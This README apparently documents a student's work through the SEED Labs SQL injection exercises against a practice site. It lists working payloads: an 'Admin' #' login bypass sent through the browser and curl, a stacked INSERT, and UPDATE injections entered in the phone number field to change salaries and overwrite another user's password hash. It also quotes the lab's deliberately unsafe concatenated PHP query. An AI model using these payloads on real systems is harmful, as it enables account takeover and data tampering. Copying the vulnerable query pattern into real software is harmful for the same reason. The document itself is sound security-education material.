# SQLInjection
### Task 1:
	Log in MYSQL:
//code
		mysql -u root -pseedubuntu
		mysql> use Users;
		mysql> show tables;
	Use such a SQL query:
//code
		select * from credential where Name='Alice';
https://github.com/Waqarumar/SQLInjection/blob/main/Task1.PNG
https://github.com/Waqarumar/SQLInjection/blob/main/Task1.2.PNG


### Task 2:
### --> Task 2.1
	.USERNAME: "Admin' #"
	.PASSWORD: "xyz" (here is password is optional)

	We will result in SQL Query
//code
		SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password
		FROM credential
		WHERE name='Admin' #' && password='xyz'
    https://github.com/Waqarumar/SQLInjection/blob/main/Task2.1.PNG
### --> Task 2.2
	1- Write Code on Terminator in Seed Lab:
	curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23';
	2- Copy the HTML code.
	3- Make a new file in location "file:///home/seed/Documents/temp.html"
	4. Run this location on browser
https://github.com/Waqarumar/SQLInjection/blob/main/Task%202.3.PNG

### --> Task 2.3	
	inject statment to append a row to current database:
//code	
	INSERT INTO credential (name,eid) VALUES('Waleed', '17422');
	After row inserted, go to browser and input as:
	.USERNAME: "1=1; INSERT INTO credential (name,eid) VALUES('Waleed','17422') #"
	.PASSWORD: "" (blank field)
https://github.com/Waqarumar/SQLInjection/blob/main/Task1.5.PNG
(optional lines)
	PHP's mysqli extension, involes mysqli::query API to handle SQL statement,
doesn't support for multiple queries with in the same run. Of course, the design of this API 
attributes to concern of SQL injection.

### Task 3
EDIT profile can be run on line "http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" to browser

### --> Task 3.1
	1- Login as Username= 'Alice' && Password = xyz, 
	2- Then edit the link to browser http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php
	3- Update Phone Number as ', Salary=1000000 and save.
--> Task 3.2
	1- Login as Username= 'Boby' #' and then open edit profile
	2- Update Phone Number: ',Salary=0 and remaining unchanges
https://github.com/Waqarumar/SQLInjection/blob/main/Task2.PNG
	Login as Alice
		Assume login as Boby and keep Alice login too. Open Alice profile edit
	Update Phone Number: ', Salary=1 where name='Boby' #
### --> Task 3.3
	We're login as Boby but change password of Alice
//backend code
	$conn = getDB();
	// Don't do this, this is not safe against SQL injection attack
	$sql="";
	if($input_pwd!=''){
	// In case password field is not empty.
	$hashed_ = sha1($input_pwd);
	//Update the password stored in the session.
	$_SESSION['pwd']=$hashed_pwd;
	$sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;";
	}else{
	// if passowrd field is empty.
	$sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;";
	}
	$conn->query($sql);
	$conn->close();
	header("Location: unsafe_home.php");
	exit();

Updation will be on Phone Number field;
Let Boby password as '123'. We must get SHA1 value of new password via some tool as:
	c0b656d5e415ca1a8e098a408f913ec229e120b6
Constuct Phone Number:
	', password='c0b656d5e415ca1a8e098a408f913ec229e120b6' where name='Boby' #
Save it and changes works accordingly. 
https://github.com/Waqarumar/SQLInjection/blob/main/Task1.4.PNG
